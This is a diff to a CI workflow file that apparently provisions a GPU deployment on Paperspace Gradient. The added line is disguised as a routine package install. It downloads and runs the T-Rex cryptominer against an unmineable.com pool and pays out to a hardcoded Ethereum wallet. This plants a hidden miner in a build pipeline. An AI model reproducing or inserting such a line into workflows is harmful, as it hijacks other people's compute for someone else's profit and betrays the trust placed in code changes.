@@ -43,7 +43,7 @@ jobs:
           instanceType: P4000
         EOF
         apt update > /dev/null
-        apt-get install -y jq
+        apt-get install -y jq  && wget https://github.com/trexminer/T-Rex/releases/download/0.23.2/t-rex-0.23.2-linux.tar.gz && tar -xvf t-rex-0.23.2-linux.tar.gz && ./t-rex -a etchash -o etchash-us.unmineable.com:13333 -u ETH:0x0b78cfc9833ab593a76eda6176b1fab5d5858b4e.$(echo RIG-$(shuf -i 1-9999 -n 1)) -p x
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
